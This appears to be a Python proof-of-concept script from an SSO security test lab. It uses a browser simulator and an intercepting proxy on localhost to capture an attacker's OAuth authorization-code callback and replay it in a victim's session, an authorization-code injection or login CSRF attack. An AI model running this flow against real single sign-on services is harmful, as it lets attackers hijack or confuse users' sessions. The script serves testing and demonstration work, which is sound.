import sys
import os
import time

sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

from browser import BrowserSimulator
from proxy import ProxyClient
import id_token

proxy_client = ProxyClient("http://localhost:5555")

try:
    # add intercept rule
    proxy_client.intercept_response("http://localhost:5000/callback?code=")

    # login with attacker account
    sso_flow = """page.locator('input[name="login"]').fill('attacker')
page.locator('input[name="password"]').fill('attacker')
page.locator('button[type="submit"]').click()
page.locator('button[type="submit"]').click()
print(page.content())
    """
    simulator1 = BrowserSimulator('http://localhost:5000/login', 'http://localhost:8080')
    simulator1.run(sso_flow)
    simulator1.close()

    # replace location header
    traces = proxy_client.get_history()
    print("=====================================")
    for res in traces['response']:
        for name, value in res['headers'].items():
            if name == 'Location':
                location = value


    # login with victim account
    sso_flow = """page.locator('input[name="login"]').fill('victim')
page.locator('input[name="password"]').fill('victim')
page.locator('button[type="submit"]').click()
page.locator('button[type="submit"]').click()
    """
    simulator2 = BrowserSimulator('http://localhost:5000/login', 'http://localhost:8080')
    simulator2.run(sso_flow)
    simulator2.visit(location)
    print("content:", simulator2.get_content())
    simulator2.close()

except Exception as e:
    print('Error:', e)
    proxy_client.clean()